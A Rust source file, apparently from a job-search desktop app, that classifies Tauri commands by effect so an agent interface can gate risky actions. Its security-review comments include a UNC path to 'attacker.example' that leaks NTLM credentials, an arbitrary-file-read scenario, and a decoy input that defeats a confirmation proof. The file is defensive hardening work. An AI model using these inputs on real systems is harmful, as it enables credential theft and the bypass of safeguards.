//! The pipeline → resume → documents chain, plus job preferences,
//! the contact profile, and scraping.
//!
//! One contiguous shard of `POLICY`, split out under R8's LOC cap and
//! concatenated back in `lib.rs`'s `generate_handler!` order by the parent.

use super::*;

pub(super) const PIPELINE_RESUME_AND_DOCUMENTS: &[PolicyEntry] = &[
    // commands/pipeline.rs
    // Same charged-generation path as `ai_generate` (verified: charges
    // `charge_provider_daily` after admission). Same no-id / WEAK spend-total
    // fallback.
    PolicyEntry {
        path: "commands::pipeline::generate_pipeline",
        effect: Effect::Irreversible(ProofSource::Scalar {
            read_command: "ai_spend_summary",
            path: &["today", "inputTokens"],
        }),
    },
    // commands/resume.rs
    // CRITICAL fix (security review round 3), reclassified from `Read`: zero
    // renderer references (ADR-038 Context) turned out to matter for more
    // than dead-code hygiene — `extraction::extract_resume` runs
    // `std::fs::read(&path)` on the caller-supplied path BEFORE `route()`'s
    // extension check, with NO validation at all (unlike this CLI's own
    // pointer-file read, which `is_safe_local_data_dir` guards for exactly
    // this shape). A UNC path (`\\attacker.example\share\x.pdf`) forces an
    // outbound SMB/WebDAV connection and can leak NTLM credentials on
    // Windows regardless of extension; any other absolute path discloses
    // whatever readable file happens to carry a supported extension into
    // the LLM's context. `Read` truthfully described "no persisted state
    // change" but not "safe to dispatch by name with an arbitrary caller
    // path" — the same distinction the module doc's stub-command cases
    // (`ai_unload_model`, `support_get_system_info`) draw on a different
    // axis.
    PolicyEntry {
        path: "commands::resume::extract_resume",
        effect: Effect::NotExposed(
            "reads std::fs::read(&path) on a fully caller-controlled path with no validation, \
             before the extension check even runs — an arbitrary local file read, and a UNC \
             path forces an outbound SMB/WebDAV connection regardless of extension; zero \
             renderer references means the CLI would be this shape's only caller",
        ),
    },
    PolicyEntry {
        path: "commands::resume::resume_validate_content",
        effect: Effect::Read,
    },
    // commands/resume_pipeline/mod.rs
    // Multi-stage AI-driven résumé/cover-letter generation; charges provider
    // spend. Scoped to a real résumé DOCUMENT (`resumeId`) — proof is that
    // document's own `name`, read via `documents_list`, matched by id.
    // `id_field: &["req", "resumeId"]` (HIGH fix — security review round 2):
    // `resume_pipeline_run`'s own `#[tauri::command]` signature takes ONE
    // wrapped `req: ResumePipelineRunRequest` argument, so the wire body is
    // `{"req": {"resumeId": ..., ...}}` — a flat `"resumeId"` selector read
    // the ceremony's own TOP LEVEL, where the caller's real `resumeId` never
    // lives, making this row permanently unsatisfiable (`proof_unavailable`
    // on every attempt). `match_field: "_id"` (also HIGH fix): `documents_
    // list` returns `DocumentRecord`, which serializes its id as `_id`
    // (`#[serde(rename = "_id")]`), not `id` — the SAME field this repo has
    // already been bitten by once (`reference_documentrecord_id_is_not_the_
    // wire_shape`), walked into again here.
    PolicyEntry {
        path: "commands::resume_pipeline::resume_pipeline_run",
        effect: Effect::Irreversible(ProofSource::ListMatch {
            read_command: "documents_list",
            id_field: &["req", "resumeId"],
            match_field: "_id",
            value_field: "name",
        }),
    },
    PolicyEntry {
        path: "commands::resume_pipeline::resume_pipeline_get",
        effect: Effect::Read,
    },
    PolicyEntry {
        path: "commands::resume_pipeline::resume_pipeline_list_for_job",
        effect: Effect::Read,
    },
    // Same charged AI-regenerate path as `resume_pipeline_run`, scoped to a
    // real run (`runId`) — proof is that run's own `jobUrl`, read via
    // `resume_pipeline_get`. `LookupInput::FromCaller(&["req", "runId"])`
    // (HIGH fix — security review round 2, worse than the row above):
    // `resume_pipeline_regenerate_section` ALSO takes one wrapped `req`
    // argument, so a flat `"runId"` selector didn't just fail to resolve —
    // Tauri silently ignores unknown TOP-LEVEL body keys, so
    // `--input '{"runId":"A","req":{"runId":"B",...}}'` resolved the proof
    // against run A's `jobUrl` while the real command acted on run B: an
    // UNBOUND ceremony, satisfiable by reading a record the command never
    // touches. Reading from `req.runId` — the SAME location the command
    // itself reads its target from — closes that; see
    // `the_real_resume_pipeline_regenerate_section_policy_row_ignores_a_
    // decoy_top_level_run_id` (proof tests, run against THIS row) and
    // `build_input_ignores_a_decoy_top_level_field_and_reads_only_the_
    // wrapped_path` (the hand-typed pure-logic pin) for the regression
    // guards.
    PolicyEntry {
        path: "commands::resume_pipeline::resume_pipeline_regenerate_section",
        effect: Effect::Irreversible(ProofSource::Lookup {
            read_command: "resume_pipeline_get",
            key: "runId",
            input: LookupInput::FromCaller(&["req", "runId"]),
            path: &["jobUrl"],
        }),
    },
    // Records a keep/remove verdict on the saved quality report — a
    // decision that can be re-recorded, nothing deleted.
    PolicyEntry {
        path: "commands::resume_pipeline::resume_pipeline_resolve_fabrication",
        effect: Effect::Reversible,
    },
    // commands/documents.rs
    PolicyEntry {
        path: "commands::documents::documents_list",
        effect: Effect::Read,
    },
    PolicyEntry {
        path: "commands::documents::documents_import",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::documents::documents_recommend_template",
        effect: Effect::Read,
    },
    // Deletes a stored document's extracted text permanently — no undo.
    // Proof is the target document's own `name`, read via `documents_list`.
    // `match_field: "_id"` (HIGH fix — security review round 2):
    // `documents_list` returns `DocumentRecord`, whose id serializes as
    // `_id` (`#[serde(rename = "_id")]`), not `id` — see
    // `resume_pipeline_run`'s row comment above for the shared root cause.
    // `id_field: "id"` is unaffected: `documents_remove`'s own signature
    // takes a flat top-level `id`, not a wrapped `req`.
    PolicyEntry {
        path: "commands::documents::documents_remove",
        effect: Effect::Irreversible(ProofSource::ListMatch {
            read_command: "documents_list",
            id_field: &["id"],
            match_field: "_id",
            value_field: "name",
        }),
    },
    PolicyEntry {
        path: "commands::documents::documents_set_default",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::documents::documents_get_text",
        effect: Effect::Read,
    },
    // commands/job_preferences.rs
    PolicyEntry {
        path: "commands::job_preferences::job_preferences_get",
        effect: Effect::Read,
    },
    PolicyEntry {
        path: "commands::job_preferences::job_preferences_set",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::job_preferences::job_preferences_set_salary_expectation",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::job_preferences::job_preferences_set_semantic_scoring",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::job_preferences::job_preferences_set_extra_agency_companies",
        effect: Effect::Reversible,
    },
    // commands/contact_profile.rs
    // The generic tier's reply for this row is projected to a photo-less
    // allowlist before it ever reaches an agent (issue #1180) — the raw
    // command still returns the whole `ContactProfile`, `photo` included, to
    // the renderer's own `invoke()`; see
    // `agent_call::reshape::project_contact_profile_get`.
    PolicyEntry {
        path: "commands::contact_profile::contact_profile_get",
        effect: Effect::Read,
    },
    PolicyEntry {
        path: "commands::contact_profile::contact_profile_set",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::contact_profile::contact_profile_header_line",
        effect: Effect::Read,
    },
    // commands/scrape.rs
    // Writes scraped postings into the shared cache — additive/recomputable.
    PolicyEntry {
        path: "commands::scrape::scrape_boards",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::scrape::scrape_url",
        effect: Effect::Reversible,
    },
    // Reclassified `Read` → `Reversible` (HIGH fix — security review round
    // 4): the prior "synchronous fetch/return only, no persistence" comment
    // was checked against the SIGNATURE, never the body — on a resolved
    // posting it upserts `(url, company)` into `DiscoveredCompanyStore` via
    // `harvest_ats_refs` (ADR-031 §c, same slug-harvest seam `scrape_boards`/
    // `scrape_url` above already feed), letting an `agent call` caller write
    // an attacker-chosen company/slug pair into that store through what
    // this table certified as a freely-dispatchable READ. `Reversible`,
    // not `Irreversible`: same
    // additive/recomputable-cache reasoning as `scrape_boards`/`scrape_url`
    // just above — a harvested slug is re-derivable by resolving/scraping
    // again, no user-authored content is lost, and `DiscoveredCompanyStore`
    // is `Resettable` (`privacy_reset_app` wipes it, `commands::privacy`).
    PolicyEntry {
        path: "commands::scrape::scrape_resolve_url",
        effect: Effect::Reversible,
    },
    // Re-verified (issue #1106): now addressed by `url` and reaches a SECOND
    // store (`AutopilotStore::update_found_job_descriptions`, a persisted
    // `FoundJob.description` patch across every matching record) rather than
    // only the ephemeral `PostingsCache`. Still `Reversible`, not
    // `Irreversible`: a description patch is itself re-correctable by another
    // call to this same command, and re-derivable by re-scraping/resolving —
    // no user-authored content is lost, same reasoning as `scrape_url`/
    // `scrape_resolve_url` just above. No `ProofSource` is added: that type
    // only attaches to `Effect::Irreversible(ProofSource)` in this table
    // (`Reversible` is a unit variant with no payload) — wiring a proof
    // requirement onto a `Reversible` row would need an `Effect` enum change,
    // out of scope for this fix.
    PolicyEntry {
        path: "commands::scrape::scrape_update_description",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::scrape::scrape_persist_job",
        effect: Effect::Reversible,
    },
    // Verified: the code's OWN doc comment calls this "the real undo for
    // scrape_persist_job" — a paired toggle on the same (jobId,
    // interactionType) key, not a destructive delete.
    PolicyEntry {
        path: "commands::scrape::scrape_remove_interaction",
        effect: Effect::Reversible,
    },
    PolicyEntry {
        path: "commands::scrape::scrape_list_postings",
        effect: Effect::Read,
    },
    // Unconditional wipe of EVERY live posting — no selector, matches the
    // module doc's "any selector that can expand to everything" rule. Proof
    // is the exact count about to be lost, read via `scrape_list_postings`
    // itself.
    PolicyEntry {
        path: "commands::scrape::scrape_clear_postings",
        effect: Effect::Irreversible(ProofSource::Count {
            read_command: "scrape_list_postings",
        }),
    },
    PolicyEntry {
        path: "commands::scrape::scrape_list_interactions",
        effect: Effect::Read,
    },
];
